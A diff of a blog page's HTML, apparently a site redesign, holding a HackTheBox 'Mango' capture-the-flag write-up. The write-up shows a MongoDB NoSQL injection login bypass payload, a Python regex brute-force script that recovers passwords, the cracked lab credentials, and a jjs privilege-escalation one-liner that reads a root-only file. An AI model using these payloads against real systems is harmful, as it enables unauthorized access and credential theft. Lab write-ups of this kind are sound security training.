@@ -1,112 +1,99 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Mango Write Up - AJDIN</title><link rel="icon" type="image/png" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta property="og:title" content="HackTheBox Mango Write Up" />
-<meta property="og:description" content="This is a write up on how to gain root on HackTheBox Mango" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://ajdin.io/posts/htb/mango/" />
-<meta property="article:published_time" content="2020-04-18T13:28:11+02:00" />
-<meta property="article:modified_time" content="2020-04-18T13:28:11+02:00" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HackTheBox Mango Write Up"/>
-<meta name="twitter:description" content="This is a write up on how to gain root on HackTheBox Mango"/>
-<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
-
-	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/normalize.css" />
-	<link rel="stylesheet" type="text/css" media="screen" href="https://ajdin.io/css/main.css" /><link rel="stylesheet" type="text/css" href="https://ajdin.io/css/dark.css"  />
-
-	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
-	<script src="https://ajdin.io/js/main.js"></script>
-	<script src="https://ajdin.io/cookieconsent.js"></script>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Vollkorn:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    
+    
+    <title>HackTheBox Mango Write Up | Ajdin&#39;s blog</title>
 </head>
-
 <body>
-	<div class="container wrapper post">
-		<div id="cookies-eu-banner" style="display: none;" >
-    	By continuing to visit this site, you accept the use of anonymized cookies for analytics.
-	<a href="https://ajdin.io/privacy" id="cookies-eu-more">Read more</a>.
-	
-	<button id="cookies-eu-accept"><a>Accept</a></button>
+        <div class="container"><div id="header">
+    <div id="header-top">
+        <div id="header-left">
+            <a href="/" class="link-fix">
+            <h1 class="title"> Ajdin&#39;s blog</h1>
+            <h3 class="handle">@ajdintrejic</h3>
+            </a>
+        </div>
+        <div id="header-right">
+            
+            
+            
+             
+            
+              <a class="social-icons__link" rel="me" title="Twitter"
+                 href="https://twitter.com/ajdintrejic"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="twitter"></i>
+        
+              </a>
+            
+          
+             
+            
+              <a class="social-icons__link" rel="me" title="GitHub"
+                 href="https://github.com/ajdintrejic"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="github"></i>
+        
+              </a>
+            
+          
+             
+            
+              <a class="social-icons__link" rel="me" title="RSS"
+                 href="/index.xml"
+                 target="_blank" rel="noopener">
+                <div class="social-icons__icon" style="background-image: url('')"></div>
+                <i data-feather="rss"></i>
+        
+              </a>
+            
+             
+        </div>
+    </div>
+    <div class="nav-bar">
+        
+        <a class="nav-item link-fix" href="/">
+                
+                Home
+        </a>
+        
+        <a class="nav-item link-fix" href="/about">
+                
+                About
+        </a>
+        
+        <a class="nav-item link-fix" href="/tags">
+                
+                Tags
+        </a>
+        
+    </div>
 </div>
-<div class="header">
-	<base href="https://ajdin.io/">
+
+<div id="content">
+<h2 class="post-title">HackTheBox Mango Write Up</h2>
 
 
 
-	<h1 class="site-title"><a href="https://ajdin.io/">AJDIN</a></h1>
-	<div class="site-description"><h2>ajdin.io</h2><nav class="nav social">
-			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
-		</nav>
-	</div>
-
-	<nav class="nav">
-		<ul class="flat">
-			
-			<li>
-				<a href="/">Home</a>
-			</li>
-			
-			<li>
-				<a href="/posts">Archive</a>
-			</li>
-			
-			<li>
-				<a href="/about">About</a>
-			</li>
-			
-			<li>
-				<a href="/tags">Tags</a>
-			</li>
-			
-		</ul>
-	</nav>
-</div>
+<div class="date">Apr 18, 2020</div>
 
 
-		<div class="post-header">
-			<h1 class="title">HackTheBox Mango Write Up</h1>
-			<div class="meta">Posted at &mdash; Apr 18, 2020</div>
-		</div>
 
-		
-		<div class="toc">              
-			<h3>Table of Contents</h3>
-			<nav id="TableOfContents">
-  <ul>
-    <li><a href="https://ajdin.io/posts/htb/mango/#reconnaissance">Reconnaissance</a></li>
-    <li><a href="https://ajdin.io/posts/htb/mango/#getting-user-account">Getting user account</a>
-      <ul>
-        <li><a href="https://ajdin.io/posts/htb/mango/#nosql-injection">NoSQL injection</a></li>
-        <li><a href="https://ajdin.io/posts/htb/mango/#bruteforcing-the-password">Bruteforcing the password</a></li>
-      </ul>
-    </li>
-    <li><a href="https://ajdin.io/posts/htb/mango/#getting-root-account">Getting root account</a>
-      <ul>
-        <li><a href="https://ajdin.io/posts/htb/mango/#privilege-escalation-with-jjs">Privilege escalation with JJS</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-			<hr>
-		</div>              
-		
-		</aside>              
+<br/>
 
-		<div class="markdown">
-              		
 <h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run nmap,</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
-</code></pre></td></tr></table>
-</div>
-</div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
+</code></pre></div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
 <p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
 <p><img src="/htb/mango/mango_search_page.png" alt="page"></p>
 <p><img src="/htb/mango/mango_analytics_page.png" alt="page"></p>
@@ -127,72 +114,16 @@ staging-order.mango.htb</p>
 <p><img src="/htb/mango/request.png" alt="request"></p>
 <p>Edit the request:</p>
 <p>Before:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
-</code></pre></td></tr></table>
-</div>
-</div><p>After:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
-</code></pre></td></tr></table>
-</div>
-</div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
+</code></pre></div><p>After:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
+</code></pre></div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
 <p><img src="/htb/mango/request_reply.png" alt="reply"></p>
 <p><img src="/htb/mango/after_login.png" alt="afterlogin"></p>
 <h3 id="bruteforcing-the-password">Bruteforcing the password<a class="anchor" href="#bruteforcing-the-password">#</a></h3>
 <p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
 <p>You should change the cookie ID.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> stringurl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://example.com&#34;</span>
 headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;exmaple.com&#34;</span>}
 cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>: <span style="color:#e6db74">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
@@ -230,21 +161,11 @@ possible_chars <span style="color:#f92672">=</span> list(string<span style="colo
                     <span style="color:#66d9ef">break</span>
     <span style="color:#66d9ef">return</span> usernamesfor u <span style="color:#f92672">in</span> get_usernames():
     get_password(u)
-</code></pre></td></tr></table>
-</div>
-</div><p>This will run for some time, the output is:</p>
+</code></pre></div><p>This will run for some time, the output is:</p>
 <p><img src="/htb/mango/password_bruteforce.png" alt="success"></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
 mango:h3mXK8RhU~f{]f5H
-</code></pre></td></tr></table>
-</div>
-</div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
+</code></pre></div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
 <p><img src="/htb/mango/user_txt.png" alt="usertxt"></p>
 <h2 id="getting-root-account">Getting root account<a class="anchor" href="#getting-root-account">#</a></h2>
 <p>First, I switch from sh to bash by running /bin/bash.</p>
@@ -252,65 +173,70 @@ mango:h3mXK8RhU~f{]f5H
 <p><img src="/htb/mango/jjs.png" alt="jjs"></p>
 <h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS<a class="anchor" href="#privilege-escalation-with-jjs">#</a></h3>
 <p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
-</code></pre></td></tr></table>
-</div>
-</div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
+</code></pre></div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
 <p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
 
 
-		</div>
 
-		<div class="post-tags">
-			
-				
-					<nav class="nav tags">
-							<ul class="flat">
-								
-								<li><a href="/tags/authentication-bypass">Authentication bypass</a></li>
-								
-								<li><a href="/tags/mongodb">MongoDB</a></li>
-								
-								<li><a href="/tags/nosql-injection">NoSQL injection</a></li>
-								
-								<li><a href="/tags/jjs">jjs</a></li>
-								
-								<li><a href="/tags/ssl-certificate">SSL certificate</a></li>
-								
-							</ul>
-					</nav>
-				
-			
-		</div>
-		</div>
-	<div class="footer wrapper">
-	<nav class="nav">
-		<div> © All rights reserved | <a href="https://ajdin.io/privacy/">Privacy</a> | 
-                <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
-	</nav>
+<div class="post-tags">
+    
+    
+    <a class="post-tag" href="https://ajdin.io/tags/mongodb/">mongodb</a>
+    
+    <a class="post-tag" href="https://ajdin.io/tags/jjs/">jjs</a>
+    </div>
+
+
+
+
+
+<div class="social-icons">
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="Twitter"
+         href="https://twitter.com/ajdintrejic"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="twitter"></i>
+
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="GitHub"
+         href="https://github.com/ajdintrejic"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="github"></i>
+
+      </a>
+    
+  
+     
+    
+      <a class="social-icons__link" rel="me" title="RSS"
+         href="/index.xml"
+         target="_blank" rel="noopener">
+        <div class="social-icons__icon" style="background-image: url('')"></div>
+        <i data-feather="rss"></i>
+
+      </a>
+    
+     
 </div>
 
 
 
-<script>feather.replace()</script>
-<script src="cookieconsent.js"></script>
+            </div><footer id="footer">
+    <p>  © 2020</p>
+</footer>
+<script src="https://unpkg.com/feather-icons"></script>
 <script>
-    new CookiesEuBanner(function () {
-        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-        
-	ga('set', 'anonymizeIp', true);
-        ga('create', 'UA-165836726-1', 'auto');
-        ga('send', 'pageview');
-    });
+  feather.replace()
 </script>
-</body>
+</div>
+    </body>
 </html>
